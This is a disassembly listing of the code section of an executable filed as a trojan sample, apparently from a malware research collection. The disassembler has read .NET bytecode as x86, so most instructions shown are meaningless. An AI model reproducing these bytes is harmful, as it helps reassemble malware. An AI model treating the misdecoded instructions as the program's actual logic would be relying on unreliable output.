
malware_samples/trojan/e6a8a6e1288879da2fa1e73228e6d87b9d6bc03cc74ee18a97bfddc9f06bfec0.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	10 d1                	adc    %dl,%cl
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 e0                	add    %ah,%al
  402015:	76 00                	jbe    0x402017
  402017:	00 03                	add    %al,(%ebx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	06                   	push   %es
  4021d0:	26 00 70 7e          	add    %dh,%es:0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 ba 21 00       	and    $0x21ba72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 b2                	jb     0x4021a8
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 ba 21 00       	and    $0x21ba72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 c4                	jb     0x4021ea
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 c4 26 00       	and    $0x26c472,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 b4             	add    %dh,-0x4c(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
